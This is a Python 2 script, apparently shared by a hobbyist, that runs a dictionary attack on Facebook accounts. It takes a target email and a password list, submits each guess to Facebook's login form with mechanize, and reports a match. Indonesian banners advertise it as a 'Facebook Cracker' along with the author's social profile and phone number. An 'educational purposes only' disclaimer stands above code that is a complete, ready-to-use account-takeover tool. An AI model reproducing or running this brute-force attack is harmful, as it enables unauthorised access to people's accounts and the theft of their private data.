#!usr/bin/python

#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 
#We are not responsible.


import sys
import random
import mechanize
import cookielib

GHT = '''
print "       \033[1;34m/* -- \033[1;31mJANGAN LUPA FOLOW AUTHOR \033[1;34m- */"
print "       /* -- \033[1;32mFACEBOOK : \033[1;33mhttps://mobile.facebook.com/ld.profile1000098661657117 \033[1;34m-- */"
print "       /* -- \033[1;31mWHATSAPP : \033[1;35m089631008798 - */"
'''
print "          \033[1;34m#************************#"
print "          #* ---- \033[1;31mDAVEKOAGOW \033[1;34m---- *#"
print "          #************************#"
print ""
print "          /**************************/"
print "          /*                        */"
print "          /* -- \033[1;32mSMK ADVENT KAIMA \033[1;34m-- */"
print "          /*                        */"
print "          /**************************/"
print ""
print "/* -- \033[0m(HACKER/CRACKER) \033[1;34m-- */"
print "/* -- \033[1;32m(SKAVENTKA) \033[1;34m-- */"
print ""
print "\033[1;33m/* - Welcome To Facebook Cracker - */ !!"
print "\033[1;31m/* - Go To Hell - */ !!!"
print ""
email = str(raw_input("\033[1;36m/* - Masukkan alamat email target - */ : "))
passwordlist = str(raw_input("/* - Masukkan nama file password list - */ : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r/* - Trying - */ %s... " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print "\n\n\n /* - Password Dapat - */.. !"
        print "\n /* - Password - */ : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n/* - Exiting program - */ ... "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n/* - Exiting program - */ ...\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n /* - Error: check your password list path - */\n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n /* - Exiting program - */ ...\n"
        sys.exit(1)
    try:
        print GHT
        print " /* - Email to crack - */ : %s" % (email)
        print " /* - Loaded - */ :" , len(passwords), "/* - passwords - */"
        print " /* - Cracking, please wait - */ ..."
    except KeyboardInterrupt:
        print "\n /* - Exiting program - */ ...\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n /* - Exiting program - */ ...\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
